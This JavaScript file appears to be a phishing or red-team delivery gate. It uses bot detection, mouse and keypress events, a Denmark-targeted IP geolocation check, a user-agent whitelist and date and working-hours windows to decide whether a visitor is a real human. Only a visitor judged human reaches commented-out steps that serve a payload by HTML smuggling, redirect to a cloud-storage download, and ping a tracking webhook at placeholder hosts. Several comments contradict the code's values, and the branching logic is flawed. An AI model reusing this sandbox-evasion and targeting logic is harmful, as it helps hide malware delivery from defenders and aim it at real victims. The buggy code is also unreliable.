import * as Botd from './botd.js';

var botdResult = true;
var hasMouseMoved = false;
var hasKeyPressed = false;


document.addEventListener('mousemove', () => hasMouseMoved = true, { once: true });
document.addEventListener('keypress', () => hasKeyPressed = true, { once: true });

async function logHuman(){

    // serve payload (html smuggling)
    // ...
    
    // serve payload (redirect to cloud storage link)
    // window.location.replace(
    //    "https://example.com/",
    // );

    // webhook
    // fetch("https://example.com?id=???"); 
    


	document.getElementById("result").innerHTML = "You are: human ";
}

function isHuman(botdResult, ipInfo){

    const ipCheckResult = isValidGeolocation(ipInfo);
    const userAgentCheckResult = isValidUserAgent();
    const workingHoursResult = workingHours();

    console.log('botd result: '+ botdResult.bot);
    console.log('mouse result: '+ hasMouseMoved);
    console.log('keypress result: '+ hasKeyPressed);
    console.log('logical CPU cores: ' + navigator.hardwareConcurrency);
    console.log('IP Info: ', ipInfo);
    console.log('IP check: ', ipCheckResult);
    console.log('User-Agent: ', userAgentCheckResult);
    console.log('workingHours: ', workingHoursResult);

    // definately human
    if(hasMouseMoved ){
        logHuman();
    }
    // most probably human
    if(!botdResult.bot && navigator.hardwareConcurrency > 2 && ipCheckResult && userAgentCheckResult && workingHoursResult){
        logHuman();
    }
    else{
        document.getElementById("result").innerHTML = "You are: bot ";
    }
}

function isValidGeolocation(ipInfo) {
    // Example check: ensure IP is not from a known data center or suspicious location
    console.log(ipInfo.country_name);
    const targetCountry = "Denmark";
    return targetCountry.includes(ipInfo.country_name);

}

function isValidUserAgent() {
    const userAgent = navigator.userAgent.toLowerCase();
    const whitelist = [
        'edg',       // Edge
        'chrome',    // Chrome, Chromium, Brave
        'firefox',   // Firefox
        'safari',    // Safari
    ];

    return whitelist.some(keyword => userAgent.includes(keyword));
}

async function fetchIPInfo(){
    const response = await fetch('http://api.ipgeolocation.io/ipgeo?apiKey=<redacted>');
    const data = await response.json();
    return data;
}

function workingHours() {
    const now = new Date();
    const dayOfMonth = now.getDate(); // 1 to 31
    const month = now.getMonth(); // 0 = January, 1 = February, ..., 11 = December
    const year = now.getFullYear();
    const hours = now.getHours();
    const minutes = now.getMinutes();

    // Customize these arrays and variables according to your requirements
    const allowedDaysRange = { start: 12, end: 18 }; // Monday to Friday
    const allowedMonths = [0, 1, 2, 5, 6, 11]; // jun(0) - dec(11) 
    const allowedYears = [2023, 2024];
    const startHour = 7;
    const endHour = 18;

    // Check if the current day, month, and year are within the allowed ranges
    const isDayAllowed = dayOfMonth >= allowedDaysRange.start && dayOfMonth <= allowedDaysRange.end;
    const isMonthAllowed = allowedMonths.includes(month);
    const isYearAllowed = allowedYears.includes(year);
    
    // Check if the current time is within the allowed working hours
    const isTimeAllowed = (hours > startHour || (hours === startHour && minutes >= 0)) &&
                          (hours < endHour || (hours === endHour && minutes <= 0));
    
    console.log(isDayAllowed , isMonthAllowed , isYearAllowed, isTimeAllowed)
    
    return isDayAllowed && isMonthAllowed && isYearAllowed && isTimeAllowed;
}


// Initialize an agent at application startup, once per page/app.
const botdPromise = Botd.load()
// Get detection results when you need them.
botdPromise
    .then((botd) => botd.detect())
    .then((tmpResult) => botdResult=tmpResult)
    .catch((error) => console.error(error))


fetchIPInfo().then(ipInfo => {
    setTimeout(isHuman, 2000, botdResult, ipInfo);
}).catch(error => {
    console.error('Failed to fetch IP info', error);
    setTimeout(isHuman, 2000, botdResult, {});
});